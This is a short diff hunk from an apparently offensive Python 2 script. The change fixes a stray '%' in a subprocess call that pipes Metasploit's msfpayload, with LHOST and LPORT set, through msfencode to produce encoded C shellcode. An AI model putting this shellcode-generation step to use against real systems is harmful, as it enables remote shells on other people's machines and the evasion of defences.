@@ -102,7 +102,7 @@ while 1:
 			print ""
 			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e %s -t c \
 								| tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
-									% (path, payload, ip, port, path, iterations, % encoder), shell=True, stdout=subp.PIPE)
+									% (path, payload, ip, port, path, iterations, encoder), shell=True, stdout=subp.PIPE)
 			
 			shellcode = proc.communicate()[0]
 			
